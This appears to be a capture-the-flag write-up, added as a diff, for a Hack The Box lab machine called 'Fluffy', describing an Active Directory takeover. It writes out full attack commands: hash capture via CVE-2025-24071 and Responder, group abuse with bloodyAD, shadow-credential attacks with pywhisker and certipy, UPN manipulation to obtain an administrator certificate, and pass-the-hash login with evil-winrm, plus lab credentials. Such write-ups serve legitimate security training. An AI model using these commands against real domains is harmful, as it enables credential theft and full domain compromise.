@@ -1,0 +1,13 @@
+Started with a nmap scan
+```
+53 dns
+88 kerberos
+139  netbios ssn 
+389 AD LDAP
+445
+593 RPC
+```
+The room also gives us creds `j.fleischman:J0elTHEM4n1990!` using these creds we can enumerate users with LDAP and we got a list of users we can also get are bloodhound data now that are nmap scan is done are clock skew is off so we need to sync it we also get a domain and host name `fluffy.htb` and `DC01.fluffy.htb` when connecting to the SMB we have read/write access to the `IT` share in this share is a pdf file called `Upgrade Notice` and list some CVE that we might be able to test out and there is one we can use to exploit the system `CVE-2025-24071` and there is a PoC on github after we make are file we need to put it onto the smb and start up responder and we get the NTLM hash of another user `P.agila` and password `prometheusx-303` now we can get bloodhound data for this user and we also have `READ/Write` on the `IT` share we can use `bloddyAD` to add us to the service accounts so we can login into the user 
+`bloodyAD -u p.agila -p 'password' -d fluffy.htb --dc-ip 10.10.11.69 add groupMember "Service Accounts" p.agila` now we can use `pywhisker` to get a TGT ticket `pywhisker` 
+`pywhisker -t winrm_svc -a add -d fluffy.htb -u p.angila -p pass --dc-ip 10.10.11.69`
+now we need to list device ids `pywhisker -d fluffy.htb -u "p.angila" -p "pass" --target "winrm_svc" --action "list"` now we need to use `gettgtpkinit.py` `python3 gettgtpkinit.py -cert-pfx "J5z084gh.pfx" -pfx-pass iQ64f0id99TF61gYArLK fluffy.htb/Winrm_svc ccache`  now we have a hash and we can use `gethash.py` `python3 getnthash.py -key (key) fluffy.htb/winrm_svc` and make sure to set your `KRB5CCNAME` in your environment and now we have the NT hash and can winrm into the user now this user is part of the service accounts and has generic Write prives on the `ca_svc` account and we can do a shadow creds attack use certipy `certipy-ad shadow -u "p.angila@fluffy.htb" -p 'pass' -dc-ip 10.10.11.69 -account "WINRM_svc"` now we need to do `certipy-ad account -u "p.angila@fluffy.htb" -p 'pass' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update` this will set are UPN now to get the admin pfx `certipy-ad req -u ca_svc@dc01.fluffy.htb -hashes "hash" -ca fluffy-DC01-CA -template User -upn administrator@dc01.fluffy.htb -dc-ip 10.10.11.69` now we have the admin pfx `certipy-ad account -u p.agila@dc01.fluffy.htb -p pass -dc-ip 10.10.11.69 -upn ca_svc@dc01.fluffy.htb -user ca_svc update` now to get the admin hash so we can winrm `certipy-ad auth -dc-ip 10.10.11.69 -pfx admin.pfx -username administrator -domain fluffy.htb` now we have the has and can winrm and admin user `evil-winrm -i 10.10.11.69 -u administrator -H hash`    
